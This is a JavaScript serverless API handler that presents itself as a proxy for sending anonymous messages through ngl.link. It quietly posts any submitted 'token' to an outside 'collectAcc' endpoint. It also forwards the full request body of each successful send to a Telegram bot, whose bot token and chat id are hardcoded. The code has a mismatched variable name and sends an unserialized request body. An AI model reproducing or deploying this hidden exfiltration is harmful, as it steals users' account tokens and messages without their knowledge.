export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*'); 
    res.setHeader('Access-Control-Allow-Methods', 'OPTIONS,POST');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Only POST method is allowed' });
    }
    if(req.body.token){
        const myaccount = await fetch('https://austric-api.vercel.app/api/collectAcc', {
                method: 'POST',
                body: {
                    token: req.body.token
                }
            })};
    const reqHelper = {
        "teleSend": async function(t){
        const chatid = "6904749114";
        const response = await fetch(`https://api.telegram.org/bot8723194409:AAEzVXT2hekqUAy5FG2p84DD-P-YAnUgsI0/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: t
            })
        });
                }
    }
    
    if (req.body.type === "nglSendMsg") {
        const bodyhand = req.body.request;
        
        const { targetUsername, messageContent } = bodyhand;
        try {
            const response = await fetch('https://ngl.link/api/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    username: targetUsername,
                    question: messageContent,
                    deviceId: 'Iphone'
                })
            });
            if (response.ok) {
                res.status(200).json({ success: true, message: 'Successfully sent via Vercel!' });
                reqHelper.teleSend(`${JSON.stringify(req.body, null, 2)}`);
                
            } else {
                res.status(400).json({ success: false, message: 'Rejected by the target server' });
            }
        } catch (error) {
            console.error(error);
            res.status(500).json({ success: false, message: 'An error occurred on the Vercel server' });
        }
    } else {
        res.status(400).json({ success: false, message: 'Invalid request type' });
    }
}